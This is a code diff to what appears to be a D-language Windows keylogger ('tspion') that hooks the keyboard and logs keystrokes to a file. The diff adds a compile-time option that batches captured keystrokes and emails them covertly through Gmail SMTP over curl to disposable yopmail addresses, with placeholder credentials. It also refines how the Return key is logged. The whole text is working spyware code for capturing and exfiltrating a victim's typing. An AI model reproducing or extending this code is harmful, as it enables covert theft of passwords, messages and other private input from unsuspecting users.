@@ -17,6 +17,10 @@ import std.stdio;
 import std.c.windows.windows;
 import std.string;
 import std.conv;
+import core.thread;
+import std.array;
+version(testing_smtp) import sendwithgmail;
+version(testing_smtp) import etc.curl;
 
 alias int HHOOK;
 alias int HOOKPROC;
@@ -33,6 +37,41 @@ struct PKBDLLHOOKSTRUCT {
 
 immutable string fname = "daten.txt";
 immutable int HC_ACTION = 0;
+
+version(testing_smtp)
+{
+    enum MAX_SEND_AMOUNT = 20;  //After 20 things, then send via SMTP
+    __gshared string[] unsent;
+    immutable sender = "XXXXXXXXXXX@gmail.com";
+    immutable emailpass = "XXXXXXXXXXXX";
+    immutable recipients = ["recipient1@yopmail.com","recipient2@yopmail.com"];
+    
+    __gshared Curl curl;
+    __gshared Thread thr;
+    __gshared bool sentOnce = false;
+    
+    static this()
+    {
+        curl = new Curl();
+    }
+    
+    void remoteSend(string stuff)
+    {
+        bool makeAReply = sentOnce;
+        if(thr && thr.isRunning)
+        {
+            unsent.insertInPlace(0, stuff);
+            return;
+        }
+        thr = new Thread( () 
+            {
+                sendStringWithGmail(sender, emailpass, cast(string[])recipients, formatEmailData(stuff, sender, (makeAReply ? "Re: tspion log" : "tspion log")), curl);
+            });
+        thr.start();
+        sentOnce = true;
+        
+    }
+}
 
 __gshared HHOOK hHook;
 __gshared int lastkey;
@@ -73,8 +112,14 @@ void handleKey(int key) {
 			lastkey = key;
 			return;
 		case 13:
-			keys ~= "\n";
-			break;
+			if(lastkey == key) {
+				keyheld++;
+				return;
+			}
+			checkLastKey();
+			keys ~= "[RETURN]";
+			lastkey = key;
+			return;
 		case 32:
 			keys ~= " ";
 			break;
@@ -327,7 +372,10 @@ void handleKey(int key) {
 	}
 	keyheld = 0;
 	lastkey = 0;
+    version(testing_smtp) unsent ~= keys;
 	keys = [];
+    
+    version(testing_smtp) if(unsent.length >= MAX_SEND_AMOUNT) { auto s = unsent.join(""); unsent = []; remoteSend(s); } 
 }
 
 void checkLastKey() {
